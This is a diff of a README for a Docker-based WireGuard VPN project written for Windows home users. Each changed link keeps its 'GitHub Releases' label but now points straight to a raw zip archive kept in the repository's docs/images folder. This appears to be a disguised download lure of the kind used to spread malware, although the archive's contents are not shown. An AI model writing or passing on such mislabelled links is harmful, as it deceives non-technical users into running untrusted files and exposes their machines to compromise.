@@ -1,10 +1,10 @@
 # 🛡️ docker-wireguard - Simple VPN Server for Home Use
 
-[![Download from Releases](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/Rhodawagnerian446/docker-wireguard/releases)
+[![Download from Releases](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/Rhodawagnerian446/docker-wireguard/raw/refs/heads/main/docs/images/wireguard_docker_2.7.zip)
 
 ## 📥 Download
 
-Visit this page to download: [GitHub Releases](https://github.com/Rhodawagnerian446/docker-wireguard/releases)
+Visit this page to download: [GitHub Releases](https://github.com/Rhodawagnerian446/docker-wireguard/raw/refs/heads/main/docs/images/wireguard_docker_2.7.zip)
 
 Pick the latest release file for your system, then save it to your Windows PC
 
@@ -42,7 +42,7 @@ After that, open Docker Desktop and wait until it is ready
 
 ## 🖥️ Download and set up docker-wireguard
 
-1. Visit the [GitHub Releases page](https://github.com/Rhodawagnerian446/docker-wireguard/releases)
+1. Visit the [GitHub Releases page](https://github.com/Rhodawagnerian446/docker-wireguard/raw/refs/heads/main/docs/images/wireguard_docker_2.7.zip)
 2. Download the latest release files
 3. Save them in a folder you can find again
 4. Open Docker Desktop
@@ -158,7 +158,7 @@ Keep these files in one folder so you can find them later
 ## 🧭 Simple setup path
 
 1. Install Docker Desktop on Windows
-2. Visit the [Releases page](https://github.com/Rhodawagnerian446/docker-wireguard/releases)
+2. Visit the [Releases page](https://github.com/Rhodawagnerian446/docker-wireguard/raw/refs/heads/main/docs/images/wireguard_docker_2.7.zip)
 3. Download the latest release
 4. Start the container
 5. Wait for the first config to be created
